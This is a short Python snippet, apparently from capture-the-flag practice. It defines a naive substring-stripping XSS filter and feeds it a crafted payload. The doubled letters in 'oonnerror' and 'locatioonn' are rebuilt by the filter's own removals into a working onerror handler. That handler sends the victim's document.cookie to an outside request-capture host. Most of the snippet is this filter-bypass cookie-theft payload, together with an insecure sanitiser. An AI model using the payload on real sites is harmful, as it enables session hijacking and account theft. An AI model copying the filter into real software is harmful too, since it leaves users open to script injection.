def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text

r = xss_filter("<img src=# oonnerror=locatioonn.href='https://hdmmsfd.request.dreamhack.games?cookie='%2bdocument.cookie>")
print(r)